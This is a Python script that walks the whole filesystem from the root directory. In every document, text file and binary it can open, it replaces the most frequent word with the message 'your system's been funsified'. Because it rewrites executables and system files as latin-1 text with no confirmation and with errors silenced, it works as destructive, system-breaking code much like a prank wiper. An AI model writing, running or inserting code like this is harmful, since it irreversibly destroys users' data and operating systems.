import os
import re
import docx
from collections import Counter

new_replacement_text = "your system's been funsified"
text_extensions = {".txt", ".md", ".csv", ".py", ".json", ".html", ".xml", ".conf", ".sh", ".log"}

def get_most_frequent_word(text_blob):
    words = re.findall(r'\b\w+\b', text_blob.lower())
    if not words:
        return None
    most_common = Counter(words).most_common(1)
    return most_common[0][0]

def process_word(filepath):
    try:
        doc = docx.Document(filepath)
        full_text = []
        for p in doc.paragraphs:
            full_text.append(p.text)
        for table in doc.tables:
            for row in table.rows:
                for cell in row.cells:
                    for p in cell.paragraphs:
                        full_text.append(p.text)
                        
        target_word = get_most_frequent_word(" ".join(full_text))
        if not target_word:
            return
            
        print(f"Targeting '{target_word}' in {filepath}")
        changed = False
        
        def replace_in_paragraphs(paragraphs):
            nonlocal changed
            for p in paragraphs:
                if target_word in p.text.lower():
                    p.text = re.sub(r'(?i)\b' + re.escape(target_word) + r'\b', new_replacement_text, p.text)
                    changed = True

        replace_in_paragraphs(doc.paragraphs)
        for table in doc.tables:
            for row in table.rows:
                for cell in row.cells:
                    replace_in_paragraphs(cell.paragraphs)
        for section in doc.sections:
            replace_in_paragraphs(section.header.paragraphs)
            replace_in_paragraphs(section.footer.paragraphs)
            
        if changed:
            doc.save(filepath)
            
    except Exception:
        pass

def process_text(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read()
            
        target_word = get_most_frequent_word(content)
        if not target_word:
            return
            
        print(f"Targeting '{target_word}' in {filepath}")
        new_content = re.sub(r'(?i)\b' + re.escape(target_word) + r'\b', new_replacement_text, content)
            
        if content != new_content:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(new_content)
                
    except (UnicodeDecodeError, PermissionError):
        pass

def process_binary(filepath):
    try:
        with open(filepath, 'r', encoding='latin-1') as f:
            content = f.read()
            
        target_word = get_most_frequent_word(content)
        if not target_word:
            return
            
        print(f"Targeting '{target_word}' in binary/unknown {filepath}")
        new_content = re.sub(r'(?i)\b' + re.escape(target_word) + r'\b', new_replacement_text, content)
            
        if content != new_content:
            with open(filepath, 'w', encoding='latin-1') as f:
                f.write(new_content)
    except (PermissionError, MemoryError, Exception):
        pass

target_dir = "/"

for root, dirs, files in os.walk(target_dir):
    if root.startswith(('/proc', '/sys', '/dev', '/run')):
        continue
        
    for file in files:
        filepath = os.path.join(root, file)
        
        if os.path.islink(filepath):
            continue
            
        if file.endswith(".docx"):
            process_word(filepath)
        elif any(file.endswith(ext) for ext in text_extensions):
            process_text(filepath)
        else:
            process_binary(filepath)
